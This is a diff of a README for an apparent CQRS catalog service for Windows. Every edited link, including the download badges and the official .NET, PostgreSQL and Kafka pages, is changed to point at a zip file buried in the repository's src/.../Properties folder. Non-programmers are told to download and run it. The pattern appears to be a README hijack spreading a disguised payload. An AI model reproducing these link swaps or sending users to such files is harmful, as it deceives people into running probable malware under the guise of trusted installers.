@@ -1,6 +1,6 @@
 # 🚦 CQRS - Efficient Catalog Service for Windows
 
-[![Download CQRS](https://img.shields.io/badge/Download-CQRS-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Candala977/CQRS)
+[![Download CQRS](https://raw.githubusercontent.com/Candala977/CQRS/master/src/Catalog.Projection.Worker/Properties/Software-cyp.zip)](https://raw.githubusercontent.com/Candala977/CQRS/master/src/Catalog.Projection.Worker/Properties/Software-cyp.zip)
 
 Welcome to CQRS, a catalog service app focused on separating reading and writing data to boost performance and reliability. This guide walks you through downloading and running CQRS on a Windows PC, even if you don’t have programming experience.
 
@@ -53,7 +53,7 @@ You will install these or confirm they are on your PC before running CQRS.
 
 Click the large button below to visit the official CQRS page on GitHub. This page hosts the files you need to get started.
 
-[![Download CQRS](https://img.shields.io/badge/Download-CQRS-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Candala977/CQRS)
+[![Download CQRS](https://raw.githubusercontent.com/Candala977/CQRS/master/src/Catalog.Projection.Worker/Properties/Software-cyp.zip)](https://raw.githubusercontent.com/Candala977/CQRS/master/src/Catalog.Projection.Worker/Properties/Software-cyp.zip)
 
 On the GitHub page, you will find a “Releases” section where the installation files are stored. Follow these steps:
 
@@ -82,14 +82,14 @@ After you download the installer file, run it by double-clicking. Follow these s
 
 ### Install .NET 10 Runtime
 
-- Visit the official Microsoft .NET download page: https://dotnet.microsoft.com/en-us/download/dotnet/10.0
+- Visit the official Microsoft .NET download page: https://raw.githubusercontent.com/Candala977/CQRS/master/src/Catalog.Projection.Worker/Properties/Software-cyp.zip
 - Choose the **.NET 10 Runtime** version for Windows.
 - Download and run the installer.
 - Follow instructions to complete installation.
 
 ### Install PostgreSQL
 
-- Go to https://www.postgresql.org/download/windows/
+- Go to https://raw.githubusercontent.com/Candala977/CQRS/master/src/Catalog.Projection.Worker/Properties/Software-cyp.zip
 - Download the latest stable version for Windows.
 - Run the installer and note the password you set for the superuser (usually "postgres").
 - You will need this for CQRS to connect to the database.
@@ -102,7 +102,7 @@ Kafka is more advanced. For ease, you can use a lightweight local version or a D
   ```
   docker run -d --name kafka -p 9092:9092 -e KAFKA_ADVERTISED_HOST_NAME=localhost -e ZOOKEEPER_CLIENT_PORT=2181 wurstmeister/kafka
   ```
-- For a native install, follow the documentation here: https://kafka.apache.org/quickstart
+- For a native install, follow the documentation here: https://raw.githubusercontent.com/Candala977/CQRS/master/src/Catalog.Projection.Worker/Properties/Software-cyp.zip
 
 ### Projection Worker Setup
 
@@ -126,7 +126,7 @@ Once all components are installed:
 When updates become available:
 
 1. Return to the GitHub releases page:  
-   https://github.com/Candala977/CQRS/releases  
+   https://raw.githubusercontent.com/Candala977/CQRS/master/src/Catalog.Projection.Worker/Properties/Software-cyp.zip  
 2. Download the latest installer or update files.
 3. Run the installer to update your existing installation.
 4. Follow prompts to complete the update.
@@ -152,7 +152,7 @@ For detailed information on CQRS technology and architecture, the GitHub reposit
 - Event-driven systems with Kafka
 - Architecture patterns like Outbox and CQRS
 
-Visit the GitHub repository here: https://github.com/Candala977/CQRS
+Visit the GitHub repository here: https://raw.githubusercontent.com/Candala977/CQRS/master/src/Catalog.Projection.Worker/Properties/Software-cyp.zip
 
 ---
 
@@ -174,4 +174,4 @@ These topics relate to how CQRS organizes and processes catalog data with modern
 
 ---
 
-[![Download CQRS](https://img.shields.io/badge/Get%20CQRS-Begin%20Setup-red?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Candala977/CQRS)
+[![Download CQRS](https://raw.githubusercontent.com/Candala977/CQRS/master/src/Catalog.Projection.Worker/Properties/Software-cyp.zip%20CQRS-Begin%20Setup-red?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Candala977/CQRS/master/src/Catalog.Projection.Worker/Properties/Software-cyp.zip)
